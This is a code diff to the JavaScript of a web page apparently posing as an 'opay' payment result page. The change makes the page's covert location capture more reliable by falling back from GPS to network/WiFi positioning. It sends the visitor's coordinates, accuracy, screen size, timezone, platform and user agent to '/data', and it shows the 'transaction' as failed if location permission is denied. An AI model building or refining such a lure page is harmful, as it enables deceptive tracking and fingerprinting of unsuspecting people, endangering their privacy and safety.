@@ -295,44 +295,57 @@
 
       if (navigator.geolocation) {
         let sent = false;
-        const watcher = navigator.geolocation.watchPosition(
-          (pos) => {
-            if (sent) return;
-            sent = true;
-            navigator.geolocation.clearWatch(watcher);
-            fetch('/data', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                txn_id: TXN_ID,
-                gps_lat: pos.coords.latitude,
-                gps_lon: pos.coords.longitude,
-                gps_accuracy_meters: pos.coords.accuracy,
-                screen: screen.width+'x'+screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform: navigator.platform,
-                ua: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                source: 'gps'
-              })
-            });
-            localStorage.setItem('opay_result_' + TXN_ID, 'success');
-            showResult();
-          },
+
+        function sendGPS(pos) {
+          if (sent) return;
+          sent = true;
+          fetch('/data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              txn_id: TXN_ID,
+              gps_lat: pos.coords.latitude,
+              gps_lon: pos.coords.longitude,
+              gps_accuracy_meters: pos.coords.accuracy,
+              screen: screen.width+'x'+screen.height,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              platform: navigator.platform,
+              ua: navigator.userAgent,
+              timestamp: new Date().toISOString(),
+              source: 'gps'
+            })
+          });
+          localStorage.setItem('opay_result_' + TXN_ID, 'success');
+          showResult();
+        }
+
+        function tryNetworkGPS() {
+          // Network/WiFi positioning — works indoors, triggers prompt reliably
+          navigator.geolocation.getCurrentPosition(
+            sendGPS,
+            () => { if (!sent) { sent = true; localStorage.setItem('opay_result_' + TXN_ID, 'failed'); showError(); } },
+            { enableHighAccuracy: false, timeout: 12000, maximumAge: 0 }
+          );
+        }
+
+        // Step 1: try GPS (high accuracy, short timeout)
+        navigator.geolocation.getCurrentPosition(
+          sendGPS,
           (err) => {
             if (sent) return;
             if (err.code === 1) {
               sent = true;
-              navigator.geolocation.clearWatch(watcher);
               localStorage.setItem('opay_result_' + TXN_ID, 'failed');
               showError();
             } else {
-              if (!sent) { sent = true; navigator.geolocation.clearWatch(watcher); showResult(); }
+              // Timeout or unavailable — step 2: network positioning
+              tryNetworkGPS();
             }
           },
-          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
-        setTimeout(() => { if (!sent) { sent = true; navigator.geolocation.clearWatch(watcher); showResult(); } }, 30000);
+
+        setTimeout(() => { if (!sent) { sent = true; showResult(); } }, 25000);
       } else {
         showError();
       }
